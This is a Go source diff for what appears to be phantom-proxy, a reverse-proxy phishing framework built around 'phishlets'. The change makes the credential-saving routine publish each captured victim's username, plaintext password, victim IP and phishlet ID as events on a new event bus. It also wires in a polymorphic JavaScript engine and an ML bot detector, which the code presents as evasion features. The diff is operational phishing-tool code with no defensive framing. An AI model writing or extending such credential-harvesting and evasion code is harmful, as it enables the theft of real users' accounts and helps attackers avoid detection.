@@ -22,6 +22,7 @@ import (
 
 	"github.com/phantom-proxy/phantom-proxy/internal/config"
 	"github.com/phantom-proxy/phantom-proxy/internal/database"
+	"github.com/phantom-proxy/phantom-proxy/internal/events"
 	"github.com/phantom-proxy/phantom-proxy/internal/ml"
 	"github.com/phantom-proxy/phantom-proxy/internal/polymorphic"
 	"github.com/phantom-proxy/phantom-proxy/internal/serviceworker"
@@ -44,6 +45,7 @@ type HTTPProxy struct {
 	sessionIndex map[string]string
 	phishlets    map[string]*Phishlet
 	reverseProxy *httputil.ReverseProxy
+	eventBus     *events.Bus
 }
 
 // ProxySession представляет прокси-сессию
@@ -896,6 +898,30 @@ func (p *HTTPProxy) SaveCredentials(sessionID, username, password string) error 
 		zap.String("username", username),
 	)
 
+	if p.eventBus != nil {
+		targetURL := ""
+		if session.TargetURL != nil {
+			targetURL = session.TargetURL.String()
+		}
+		p.eventBus.Publish(context.Background(), events.EventCredentialCaptured, &events.CredentialEvent{
+			SessionID:    sessionID,
+			Username:     username,
+			Password:     password,
+			PhishletID:   session.PhishletID,
+			VictimIP:     session.VictimIP,
+			Timestamp:    time.Now(),
+		})
+		p.eventBus.Publish(context.Background(), events.EventSessionCaptured, &events.SessionEvent{
+			SessionID:  sessionID,
+			VictimIP:   session.VictimIP,
+			TargetURL:  targetURL,
+			UserAgent:  "",
+			PhishletID: session.PhishletID,
+			State:      "captured",
+			Timestamp:  time.Now(),
+		})
+	}
+
 	return nil
 }
 
@@ -1022,4 +1048,19 @@ func (p *HTTPProxy) CheckPhishletHealth(phishletID string) map[string]interface{
 	}
 
 	return result
+}
+
+// SetEventBus sets event bus for v13 module integration
+func (p *HTTPProxy) SetEventBus(bus *events.Bus) {
+	p.eventBus = bus
+}
+
+// SetPolymorphicEngine sets polymorphic JS engine
+func (p *HTTPProxy) SetPolymorphicEngine(e *polymorphic.Engine) {
+	p.polyEngine = e
+}
+
+// SetBotDetector sets ML bot detector
+func (p *HTTPProxy) SetBotDetector(d *ml.BotDetector) {
+	p.botDetector = d
 }
